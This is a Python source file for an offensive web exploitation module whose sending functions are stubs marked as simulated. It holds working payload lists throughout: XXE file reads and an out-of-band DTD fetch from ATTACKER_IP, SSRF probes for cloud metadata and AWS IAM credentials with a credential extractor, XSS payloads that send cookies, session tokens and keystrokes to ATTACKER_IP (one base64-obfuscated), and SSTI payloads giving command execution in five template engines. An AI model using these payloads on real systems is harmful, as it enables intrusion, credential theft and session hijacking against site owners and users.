"""
Web Exploitation Module
Advanced web vulnerability exploitation (XXE, SSRF, XSS)
"""

import re
import base64
import urllib.parse
from typing import Dict, List, Optional

class WebExploitModule:
    """
    Advanced web exploitation techniques beyond basic SQLi.
    """
    
    def __init__(self):
        self.payloads = {
            'xxe': self._get_xxe_payloads(),
            'ssrf': self._get_ssrf_payloads(),
            'xss': self._get_xss_payloads()
        }
    
    def exploit_xxe(self, url: str, callback=None) -> Dict:
        """
        XML External Entity (XXE) exploitation.
        
        Args:
            url: Target URL with XML input
            callback: Optional callback for updates
        
        Returns:
            Exploitation results with extracted data
        """
        if callback:
            callback({'message': f'ðŸ”¥ Exploiting XXE on {url}...'})
        
        results = {
            'success': False,
            'data': [],
            'method': 'xxe'
        }
        
        # XXE payloads to try
        xxe_payloads = [
            # Read /etc/passwd
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>''',
            
            # Read Windows boot.ini
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "file:///c:/boot.ini">
]>
<root>&xxe;</root>''',
            
            # Out-of-band XXE (exfiltrate to attacker server)
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://ATTACKER_IP:8000/xxe.dtd">
%xxe;
]>
<root></root>''',
            
            # PHP expect wrapper (if available)
            '''<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY xxe SYSTEM "expect://id">
]>
<root>&xxe;</root>'''
        ]
        
        for payload in xxe_payloads:
            if callback:
                callback({'message': f'  ðŸ“ Testing XXE payload...'})
            
            # This would send the payload to the target
            # For now, we'll simulate the logic
            result = self._send_xxe_payload(url, payload, callback)
            
            if result and result.get('vulnerable'):
                results['success'] = True
                results['data'].append(result.get('extracted_data'))
                
                if callback:
                    callback({'message': f'âœ… XXE successful! Extracted: {result.get("extracted_data")[:100]}'})
                
                break
        
        return results
    
    def exploit_ssrf(self, url: str, parameter: str, callback=None) -> Dict:
        """
        Server-Side Request Forgery (SSRF) exploitation.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter name
            callback: Optional callback
        
        Returns:
            Exploitation results
        """
        if callback:
            callback({'message': f'ðŸ”¥ Exploiting SSRF on {url}?{parameter}=...'})
        
        results = {
            'success': False,
            'data': [],
            'method': 'ssrf',
            'targets_reached': []
        }
        
        # SSRF targets to probe
        ssrf_targets = [
            # Cloud metadata services
            ('AWS Metadata', 'http://169.254.169.254/latest/meta-data/'),
            ('AWS IAM Credentials', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
            ('Azure Metadata', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'),
            ('GCP Metadata', 'http://metadata.google.internal/computeMetadata/v1/'),
            
            # Internal services
            ('Localhost Admin', 'http://localhost:80/admin'),
            ('Internal Redis', 'http://127.0.0.1:6379/'),
            ('Internal Memcached', 'http://127.0.0.1:11211/'),
            ('Internal Elasticsearch', 'http://127.0.0.1:9200/_cat/indices'),
            
            # File reading (if supported)
            ('File Read /etc/passwd', 'file:///etc/passwd'),
            ('File Read /etc/shadow', 'file:///etc/shadow'),
        ]
        
        for target_name, target_url in ssrf_targets:
            if callback:
                callback({'message': f'  ðŸŽ¯ Probing {target_name}...'})
            
            # Encode URL for SSRF bypass
            encoded_url = urllib.parse.quote(target_url, safe='')
            
            # Try different encoding techniques
            payloads = [
                target_url,  # Direct
                encoded_url,  # URL encoded
                target_url.replace('http://', 'http://'),  # Double protocol
                f'http://0x7f.0x0.0x0.0x1/{target_url.split("/")[-1]}',  # IP obfuscation
            ]
            
            for payload in payloads:
                result = self._send_ssrf_payload(url, parameter, payload, callback)
                
                if result and result.get('accessible'):
                    results['success'] = True
                    results['targets_reached'].append({
                        'name': target_name,
                        'url': target_url,
                        'data': result.get('response_data', '')[:500]
                    })
                    
                    if callback:
                        callback({'message': f'âœ… SSRF successful! Reached {target_name}'})
                    
                    # If AWS metadata, try to extract credentials
                    if 'AWS' in target_name and 'credentials' in target_url.lower():
                        creds = self._extract_aws_credentials(result.get('response_data', ''))
                        if creds:
                            results['data'].append({
                                'type': 'aws_credentials',
                                'credentials': creds
                            })
                    
                    break  # Found SSRF, move to next target
        
        return results
    
    def exploit_xss(self, url: str, parameter: str, xss_type: str = 'reflected', callback=None) -> Dict:
        """
        Cross-Site Scripting (XSS) exploitation.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            xss_type: 'reflected', 'stored', or 'dom'
            callback: Optional callback
        
        Returns:
            Exploitation results
        """
        if callback:
            callback({'message': f'ðŸ”¥ Exploiting {xss_type.upper()} XSS on {url}...'})
        
        results = {
            'success': False,
            'payloads_worked': [],
            'method': 'xss',
            'type': xss_type
        }
        
        # XSS payloads (ordered by stealth)
        xss_payloads = [
            # Cookie stealing
            '<script>fetch("http://ATTACKER_IP:8000/?c="+document.cookie)</script>',
            
            # Image-based exfiltration (stealthier)
            '<img src=x onerror="this.src=\'http://ATTACKER_IP:8000/?c=\'+document.cookie">',
            
            # BeEF hook
            '<script src="http://ATTACKER_IP:3000/hook.js"></script>',
            
            # Keylogger
            '<script>document.onkeypress=function(e){fetch("http://ATTACKER_IP:8000/?k="+e.key)}</script>',
            
            # Session hijacking
            '<script>window.location="http://ATTACKER_IP:8000/?s="+sessionStorage.getItem("token")</script>',
            
            # DOM-based XSS
            '<img src=x onerror="eval(atob(\'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9BVFRBQ0tFUl9JUDo4MDAwLz9jPSIrZG9jdW1lbnQuY29va2ll\'))">',
            
            # Polyglot XSS (works in multiple contexts)
            'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
            
            # Obfuscated XSS
            '<svg><script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>',
        ]
        
        for payload in xss_payloads:
            if callback:
                callback({'message': f'  ðŸ“ Testing XSS payload...'})
            
            result = self._send_xss_payload(url, parameter, payload, callback)
            
            if result and result.get('executed'):
                results['success'] = True
                results['payloads_worked'].append(payload)
                
                if callback:
                    callback({'message': f'âœ… XSS successful! Payload executed.'})
        
        return results
    
    def exploit_ssti(self, url: str, parameter: str, callback=None) -> Dict:
        """
        Server-Side Template Injection (SSTI) exploitation.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            callback: Optional callback
        
        Returns:
            Exploitation results with RCE
        """
        if callback:
            callback({'message': f'ðŸ”¥ Exploiting SSTI on {url}...'})
        
        results = {
            'success': False,
            'rce_achieved': False,
            'method': 'ssti',
            'template_engine': None
        }
        
        # SSTI payloads for different template engines
        ssti_payloads = {
            'Jinja2': [
                "{{7*7}}",  # Detection
                "{{config.items()}}",  # Config disclosure
                "{{''.__class__.__mro__[1].__subclasses__()}}",  # Object exploration
                "{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}",  # RCE
            ],
            'Twig': [
                "{{7*7}}",
                "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
            ],
            'Freemarker': [
                "${7*7}",
                "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}",
            ],
            'Velocity': [
                "#set($x=7*7)$x",
                "#set($s='')#set($chr=$s.class.forName('java.lang.Runtime'))#set($obj=$chr.getRuntime())$obj.exec('whoami')",
            ],
            'Smarty': [
                "{7*7}",
                "{system('whoami')}",
            ]
        }
        
        # Try each template engine
        for engine, payloads in ssti_payloads.items():
            if callback:
                callback({'message': f'  ðŸ” Testing {engine}...'})
            
            for payload in payloads:
                result = self._send_ssti_payload(url, parameter, payload, callback)
                
                if result and result.get('vulnerable'):
                    results['success'] = True
                    results['template_engine'] = engine
                    
                    # Check if RCE payload
                    if any(cmd in payload for cmd in ['exec', 'system', 'whoami', 'Runtime']):
                        results['rce_achieved'] = True
                        
                        if callback:
                            callback({'message': f'âœ… SSTI RCE achieved on {engine}!'})
                    
                    return results
        
        return results
    
    def _get_xxe_payloads(self) -> List[str]:
        """Get XXE payload templates."""
        return [
            'file:///etc/passwd',
            'file:///c:/boot.ini',
            'http://169.254.169.254/latest/meta-data/',
            'php://filter/convert.base64-encode/resource=index.php'
        ]
    
    def _get_ssrf_payloads(self) -> List[str]:
        """Get SSRF payload templates."""
        return [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:80/admin',
            'file:///etc/passwd',
            'gopher://127.0.0.1:6379/_'
        ]
    
    def _get_xss_payloads(self) -> List[str]:
        """Get XSS payload templates."""
        return [
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            'javascript:alert(1)'
        ]
    
    def _send_xxe_payload(self, url: str, payload: str, callback=None) -> Optional[Dict]:
        """Send XXE payload (simulated for safety)."""
        # In real implementation, this would send HTTP request with XML payload
        # For safety, this is simulated
        return None
    
    def _send_ssrf_payload(self, url: str, parameter: str, payload: str, callback=None) -> Optional[Dict]:
        """Send SSRF payload (simulated for safety)."""
        # In real implementation, this would test SSRF vulnerability
        # For safety, this is simulated
        return None
    
    def _send_xss_payload(self, url: str, parameter: str, payload: str, callback=None) -> Optional[Dict]:
        """Send XSS payload (simulated for safety)."""
        # In real implementation, this would test XSS vulnerability
        # For safety, this is simulated
        return None
    
    def _send_ssti_payload(self, url: str, parameter: str, payload: str, callback=None) -> Optional[Dict]:
        """Send SSTI payload (simulated for safety)."""
        # In real implementation, this would test SSTI vulnerability
        # For safety, this is simulated
        return None
    
    def _extract_aws_credentials(self, response_data: str) -> Optional[Dict]:
        """Extract AWS credentials from metadata response."""
        creds = {}
        
        # Parse AWS metadata JSON
        try:
            import json
            data = json.loads(response_data)
            
            creds['AccessKeyId'] = data.get('AccessKeyId')
            creds['SecretAccessKey'] = data.get('SecretAccessKey')
            creds['Token'] = data.get('Token')
            
            return creds if creds.get('AccessKeyId') else None
        except:
            return None

# Singleton instance
web_exploit_module = WebExploitModule()
